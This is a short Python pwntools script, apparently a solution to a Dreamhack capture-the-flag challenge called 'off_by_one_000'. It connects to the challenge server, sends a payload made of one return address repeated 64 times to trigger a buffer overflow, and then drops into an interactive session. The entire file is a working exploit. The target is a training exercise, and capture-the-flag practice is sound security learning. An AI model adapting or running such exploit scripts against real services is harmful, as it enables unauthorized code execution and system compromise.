from pwn import *

# p = process("./off_by_one_000")
p = remote("host1.dreamhack.games",8472)

addr = 0x80485db

payload = ""
payload += p32(addr)*64
# payload += "b"*4


pause()
p.sendline(payload)

p.interactive()